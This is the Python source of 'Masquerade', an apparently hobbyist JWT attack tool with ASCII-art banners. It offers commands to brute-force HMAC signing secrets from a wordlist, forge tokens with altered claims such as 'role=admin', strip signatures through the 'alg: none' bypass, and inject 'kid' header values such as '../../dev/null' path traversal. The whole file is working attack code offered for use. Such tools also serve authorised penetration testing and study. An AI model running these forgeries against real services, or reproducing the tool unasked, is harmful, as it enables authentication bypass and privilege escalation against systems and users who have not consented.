import base64
import hmac 
import hashlib
import json
import argparse

banner = '''
 ,ggg, ,ggg,_,ggg,                                                                                                     
dP""Y8dP""Y88P""Y8b                                                                                        8I          
Yb, `88'  `88'  `88                                                                                        8I          
 `"  88    88    88                                                                                        8I          
     88    88    88                                                                                        8I          
     88    88    88    ,gggg,gg    ,g,       ,gggg,gg  gg      gg   ,ggg,    ,gggggg,    ,gggg,gg    ,gggg,8I   ,ggg,  
     88    88    88   dP"  "Y8I   ,8'8,     dP"  "Y8I  I8      8I  i8" "8i   dP""""8I   dP"  "Y8I   dP"  "Y8I  i8" "8i 
     88    88    88  i8'    ,8I  ,8'  Yb   i8'    ,8I  I8,    ,8I  I8, ,8I  ,8'    8I  i8'    ,8I  i8'    ,8I  I8, ,8I 
     88    88    Y8,,d8,   ,d8b,,8'_   8) ,d8,   ,d8b ,d8b,  ,d8b, `YbadP' ,dP     Y8,,d8,   ,d8b,,d8,   ,d8b, `YbadP' 
     88    88    `Y8P"Y8888P"`Y8P' "YY8P8PP"Y8888P"88d8P'"Y88P"`Y8888P"Y8888P      `Y8P"Y8888P"`Y8P"Y8888P"`Y8888P"Y888
                                                   I8P                                                                 
                                                   I8'                                                                 
                                                   I8                                                                  
                                                   I8                                                                  
                                                   I8                                                                  
                                                   I8                                                                  '''

print(banner)

def base64_encode(url):
    encoded_url = base64.urlsafe_b64encode(url).rstrip(b'=')
    return encoded_url

def base64_decode(url):
    decoded_url = base64.urlsafe_b64decode(url + b'='*(-len(url)%4))
    return decoded_url

def signature(key, message):
    sig = hmac.new(key, message, hashlib.sha256).digest()
    return base64_encode(sig)

def decode(token):
    header, body, sig = token.split('.')
    decoded_header = base64_decode(header.encode())
    decoded_body = base64_decode(body.encode())   

    header_json = json.loads(decoded_header)
    body_json = json.loads(decoded_body)

    print(f'\033[32m{header_json}\033[0m')
    print(f'\033[32m{body_json}\033[0m')
    return f'\033[32mSignature: {sig}\033[0m'

def crack(token, wordlist):
    header, body, sig = token.split('.')

    message = header.encode() + b'.' + body.encode()

    with open(wordlist, 'r', encoding='latin-1') as w:
        print(f'Attempting Brute Force On HMAC Secret Key.....')
        for word in w:
            word = word.strip()
            target_word = signature(word.encode(), message)

            if target_word == sig.encode():
                return f'\033[32m[+] Match Found: {word}\033[0m'
        
        return f'\033[31m[+] No Match Found: Wordlist Exhausted\033[0m'

def forge(token, claim, secret):
    header, body, sig = token.split('.')

    decoded = base64_decode(body.encode())
    payload = json.loads(decoded)

    key, value = claim.split('=')

    payload[key] = value

    new_body = base64_encode(json.dumps(payload).encode())

    message = header.encode() + b'.' + new_body

    new_sig = signature(secret.encode(), message)

    forged = header + '.' + new_body.decode() + '.' + new_sig.decode()
    return f'\033[32mForged JWT: {forged}\033[0m'

def none(token):
    header, body, sig = token.split('.')

    decoded_header = base64_decode(header.encode())
    header_json = json.loads(decoded_header)
    header_json['alg'] = 'none'
    
    new_header = base64_encode(json.dumps(header_json).encode())

    forged = f"{new_header.decode()}.{body}."
    return f'\033[32mForged JWT (none alg): {forged}\033[0m'

def kid(token, kid_value, secret=None):
    header, body, sig = token.split('.')

    decoded_header = base64_decode(header.encode())
    header_json = json.loads(decoded_header)

    header_json['kid'] = kid_value
    
    new_header = base64_encode(json.dumps(header_json).encode())
    message = new_header + b'.' + body.encode()

    if secret:
        new_sig = signature(secret.encode(), message)
        forged = f"{new_header.decode()}.{body}.{new_sig.decode()}"
    else:
        forged = f"{new_header.decode()}.{body}.{sig}"
        
    return f'\033[32mForged JWT (kid injection): {forged}\033[0m'

def credits():
    print('''\033[31m
             %%%%%%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@
             %%%%%%%%%%%%%%%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
             %%%%%%%%%%%%%%%%%%%%%%%%%%%%&&&&&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
             %%%%%%%%%%%#*,,(////((%%%%#/((((#(*((/((((###%%%%%&%%%%&%%%%%%&&&&&&&&&&&&&&&&&&
             ##((((#(((((((((/******///((((/(((((/(///(/(/(/(#%%%%%#%#%%%%%%%%%%%%%&&&&&&&&&&
             ((,,,****,*,**,***,,,,,*/**////(((//////////(((//*//****///,(#%%%%%%%%%%%%%%&&&&
             #((((#####(///***,,,,,,...,,.*//.,******/////,,,***,**,..,,.//((#####%%%%%%%%%%%
             ####(((###(((***,**,,,******,,....,.,,.,/(##%%%%%&&&%%%%%%##(/*,..,,,*/**/**/%%%
             ##########((/*//((///((/*,,,.,*,...,(%%%%%%%%%%%%%%%%%&&&&%%%%%%%#(*,**,,,,,,(##
             ((//((####(//(////////(((/////*,*#%%%%%%%&&&&%%%#%##%%&&&&&&%%%%%%%%(*,..,.,/((/
             ((#(((/(#(///**//**//**//*(((//#%%%%%%%&&&&&&&&&@&&&&&&&&&&&&&%%%%%%%%#*,,,,*//,
             (##(#((####(((///(((((/(((((((#%%%%&&&&&&&&&&@@@@@@@@@@@@@&&&&&&&%%%%%%#/*///**,
             %%%%%#%%%#%#####%%####((#((((#%%&&&&&&&&&@@@@@@@@@@@@@@@@@@@&&&&&&&&%%%%(****/((
             %%%###(**#%%%%%%%%%%%%%%%%%%##%&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&%%#(##(#/*
             #%%%#%#(#%%%%#%%%%%%&%%%%%%%##%&&&&@@@@&&&&%&&&&&&&&&&&@@@@@@@@@&&&&&&&%##%##%#(
             #############(###############&&@@@@&&%%%%%%%%%#%%%&&&%%%%&&&&@@@&&&&&&&%#%%%%%%#
             ##############(((((((((((#%&@@@@@&%%%%&&@@@&%#%%%%%%%%%%%%%%%%&&&&&&&&&%#%%%%%%%
             #########((((((((((((((%&@@@@@@@%%##%&@&&@@&&###%%%%%%#%&@@@@&%%&&@@@&&%########
             #######((((((((((((((#&&@@@@@@@&%%%%%%%&&&&%%%###%%#%%%&@@@@@&%%%&&&@@@&%#(#####
             ##########(((##(((##%&@@@@@@@@&&%%%%%%%%%#%%%##%%%%%%%%&&&@@@&%%%%&&@@@&&%######
             ################(#&&@@@@@@@@@&&&&%%%##########%%%%%#%%%%%%%%%%%%%%&&@@@@@&%#####
             ################&&@@@@@@@@@@@&&&%%%%%#(###%#%%%%%&%%%%%%%%%%%%%%%&&@@@@@@&&%####
             ##############%&@@@@@@@@@@@@&%%%%%%%######%%%%%%%%%%%%%%%%%%%%%&&&&@@@@@@@&&%###
             #############%&@@@@@@@@@@@@@@&&%%%%%%%%##%%%%%%%%%%%%%%%%%%%%%&&&&@@@@@@@@@&%%##
             #############&&@@@@@@@@@@@@@&&%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%%&&&&&&@@@@@@@@@&&%#
             %%%%%%%%%##%&&&@@@@@@@@@@&&&%%&%&&&&&&&&%%%%%%##%%%%%%%%%&&&&&&&&&@@@@@@@@@@@&%%
             %%%%%%%%%%%%%%&&@@@@@@@&&%%%%%%&%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@&&\nDev: pr0lificz\033[0m''')

def help():
    print('Masquerade is a JWT, Token Multi-Tool capable of decoding, cracking and forging JWT Tokens\nUsage: python masquerade.py <action> [options]\n  Actions:\ndecode: Decode: JWT header and payload\nExample: python masquerade.py decode -t <token>\n\ncrack: Brute-force the HMAC secret key using a wordlist\nExample: python masquerade.py crack -t <token> -w wordlist.txt\n\nforge: Modify claims and sign with a known secret\nExample: python masquerade.py forge -t <token> -c "role=admin" -s "secret"none\n\nBypass signature verification using alg: none\nExample: python masquerade.py none -t <token>\nkid: Inject or modify the kid header parameter\nExample: python masquerade.py kid -t <token> -k "../../dev/null"\n\ncredits: Show tool credits and author info\nhelp: Display this help menu')

parser = argparse.ArgumentParser(
    prog='masquerade',
    description='A JWT Token Multi-Tool capable of decoding, cracking and forging JWT Tokens'
)

subparsers = parser.add_subparsers(dest='action', required=True)

decode_parser = subparsers.add_parser('decode', help='Decode JWT header and payload')
decode_parser.add_argument('-t', '--token', required=True, help='Target JWT token')

crack_parser = subparsers.add_parser('crack', help='Brute-force the HMAC secret key using a wordlist')
crack_parser.add_argument('-t', '--token', required=True, help='Target JWT token')
crack_parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist')

forge_parser = subparsers.add_parser('forge', help='Modify claims and sign with a known secret')
forge_parser.add_argument('-t', '--token', required=True, help='Target JWT token')
forge_parser.add_argument('-c', '--claim', required=True, help='Claim to modify (e.g., role=admin)')
forge_parser.add_argument('-s', '--secret', required=True, help='HMAC secret key')

none_parser = subparsers.add_parser('none', help='Bypass signature verification using alg: none')
none_parser.add_argument('-t', '--token', required=True, help='Target JWT token')

kid_parser = subparsers.add_parser('kid', help='Inject or modify the kid header parameter')
kid_parser.add_argument('-t', '--token', required=True, help='Target JWT token')
kid_parser.add_argument('-k', '--kid', required=True, help='Value for kid injection (e.g., path traversal or injection string)')
kid_parser.add_argument('-s', '--secret', required=False, help='Optional secret key to re-sign token')

credits_parser = subparsers.add_parser('credits', help='show credits')

help_parser = subparsers.add_parser('help', help='show help / usage')

args = parser.parse_args()

if args.action == 'decode':
    print(decode(args.token))
elif args.action == 'crack':
    print(crack(args.token, args.wordlist))
elif args.action == 'forge':
    print(forge(args.token, args.claim, args.secret))
elif args.action == 'none':
    print(none(args.token))
elif args.action == 'kid':
    print(kid(args.token, args.kid, args.secret))
elif args.action == 'credits':
    credits()
elif args.action == 'help':
    help()

